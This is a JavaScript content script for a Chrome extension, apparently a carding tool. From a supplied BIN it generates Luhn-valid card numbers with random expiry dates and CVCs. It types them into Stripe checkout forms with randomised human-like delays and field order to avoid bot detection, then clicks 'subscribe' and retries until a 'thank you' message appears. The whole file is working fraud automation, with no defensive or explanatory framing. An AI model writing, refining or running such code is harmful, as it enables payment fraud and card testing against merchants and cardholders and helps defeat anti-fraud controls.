chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "start") {
    const bin = message.bin;
    processCard(bin);
  }
});

async function processCard(bin) {
  let success = false;
  let attempts = 0;

  while (!success && attempts < 5) {
    try {
      const cardNumber = generateCard(bin);
      sendStatus(`Attempt ${attempts + 1}: Trying with card ${cardNumber}`);

      const cardInput = document.querySelector("input[name='cardnumber']");
      const expiryInput = document.querySelector("input[name='exp-date']");
      const cvcInput = document.querySelector("input[name='cvc']");
      const nameInput = document.querySelector("input[name='name']");
      const emailInput = document.querySelector("input[type='email']");

      if (!cardInput || !expiryInput || !cvcInput || !nameInput) {
        throw new Error("Stripe form not detected!");
      }

      if (emailInput && !emailInput.value) {
        await simulateTyping(emailInput, `user${Date.now()}@example.com`);
      }

      // Fill fields in random order
      const fields = [
        { element: cardInput, value: cardNumber },
        { element: expiryInput, value: `${Math.floor(Math.random() * 12) + 1}/${
          Math.floor(Math.random() * 5) + 25
        }` },
        { element: cvcInput, value: `${Math.floor(Math.random() * 900) + 100}` },
        { element: nameInput, value: "@PhiloWise" },
      ];
      await fillFieldsInRandomOrder(fields);

      const subscribeButton = Array.from(document.querySelectorAll("button"))
        .find((btn) => btn.innerText.toLowerCase().includes("subscribe"));
      if (!subscribeButton) {
        throw new Error("Subscribe button not found!");
      }

      await randomDelay(2000, 5000);
      subscribeButton.click();

      const isSuccessful = await monitorDOMForSuccess();
      if (isSuccessful) {
        sendStatus("Subscription Successful!");
        success = true;
        break;
      } else {
        throw new Error("Failed to detect success.");
      }
    } catch (error) {
      logError(error);
      attempts++;
      sendStatus(`Attempt ${attempts} failed.`);
    }
  }

  if (!success) {
    sendStatus("All attempts failed.");
  }
}

function generateCard(bin) {
  const randomDigits = Array.from({ length: 15 - bin.length }, () => Math.floor(Math.random() * 10)).join("");
  const cardWithoutCheckDigit = bin + randomDigits;
  return cardWithoutCheckDigit + calculateLuhnCheckDigit(cardWithoutCheckDigit);
}

function calculateLuhnCheckDigit(cardNumber) {
  let sum = 0;
  let shouldDouble = true;
  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cardNumber[i], 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return (10 - (sum % 10)) % 10;
}

async function simulateTyping(inputElement, value) {
  for (const char of value) {
    inputElement.value += char;
    inputElement.dispatchEvent(new Event("input", { bubbles: true }));
    await randomDelay(50, 150);
  }
}

async function fillFieldsInRandomOrder(fields) {
  const shuffledFields = fields.sort(() => Math.random() - 0.5);
  for (const field of shuffledFields) {
    await simulateTyping(field.element, field.value);
    await randomDelay(200, 500);
  }
}

function monitorDOMForSuccess() {
  return new Promise((resolve) => {
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.target.textContent?.toLowerCase().includes("thank you")) {
          observer.disconnect();
          resolve(true);
        }
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
  });
}

function randomDelay(min, max) {
  return new Promise((resolve) => setTimeout(resolve, Math.random() * (max - min) + min));
}

function logError(error) {
  console.error("Error:", error);
  sendStatus(`Error: ${error.message}`);
}

function sendStatus(status) {
  chrome.runtime.sendMessage({ type: "status-update", status });
}
